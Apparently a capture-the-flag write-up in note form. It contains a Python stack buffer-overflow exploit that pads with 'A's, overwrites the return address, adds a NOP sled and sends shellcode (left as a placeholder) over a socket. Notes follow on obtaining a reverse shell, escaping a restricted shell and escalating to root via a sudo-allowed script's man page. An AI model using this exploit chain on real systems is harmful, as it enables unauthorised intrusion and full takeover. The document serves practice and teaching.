- final exploit:
    #!/usr/bin/python3
    import sys, socket, pdb
    
    target = sys.argv[1]
    targetport = int(sys.argv[2])
    
    if len(sys.argv) != 3:
        print('Usage: "' + sys.argv[0] + ' 0.0.0.0 21"')
        sys.exit()
    
    # Set payload
    buf = <shellcode>
    
    buffer = b'A' * 524 # Set EIP
    buffer += b"\xf3\x12\x17\x31" # Set Return address 
    buffer += b"\x90" * 16 # Set NOPs
    buffer += buf
    
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((target, targetport))
    s.send(buffer) # Set send payload
    s.close()


- got reverse shell as user puck
- in a restricted shell
- got a shell on the actual linux machine by running a python script to spawn a reverse shell
- looking for privilege escalation opportunities
- sudo -l shows a script that can be run as root
- manual subcommand of script allows man page view
- gtfobins to find exploit to spawn root shell
- got root access
